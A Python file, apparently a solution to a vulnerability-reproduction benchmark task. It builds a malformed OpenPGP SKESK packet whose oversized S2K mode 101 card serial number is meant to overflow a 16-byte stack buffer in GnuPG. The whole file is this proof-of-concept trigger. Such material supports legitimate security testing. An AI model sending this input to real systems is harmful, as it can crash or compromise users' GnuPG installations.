import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in GPG S2K parsing.
        
        The vulnerability exists in the handling of GPG S2K (Mode 101) card serial numbers,
        where an excessively long serial number causes a stack buffer overflow.
        
        We construct a Symmetric-Key Encrypted Session Key (SKESK) packet (Tag 3) which
        contains an S2K specifier.
        """
        
        # SKESK Packet (Tag 3) using Old Format
        # Tag byte: 0x80 | (Tag 3 << 2) | Length_Type 0 (1 byte)
        # 0x80 | 0x0C | 0x00 = 0x8C
        tag = b'\x8c'
        
        # Packet Body Length
        # We need a body that accommodates the prefix and enough serial bytes to overflow.
        # Prefix size: 1 (Ver) + 1 (Algo) + 1 (Mode) + 3 (Magic) + 1 (Prot) = 7 bytes.
        # Standard serial buffer is 16 bytes. We provide 18 bytes to trigger overflow.
        # Total body length: 7 + 18 = 25 bytes (0x19).
        length = b'\x19'
        
        # Packet Body
        version = b'\x04'        # Version 4
        algo = b'\x09'           # AES-256
        s2k_mode = b'\x65'       # Mode 101 (GnuPG Extension)
        s2k_magic = b'GNU'       # Magic bytes
        s2k_prot = b'\x01'       # Protection mode (divert to card)
        
        # 18 bytes of serial number to overflow the 16-byte stack buffer
        serial = b'A' * 18
        
        payload = tag + length + version + algo + s2k_mode + s2k_magic + s2k_prot + serial
        
        return payload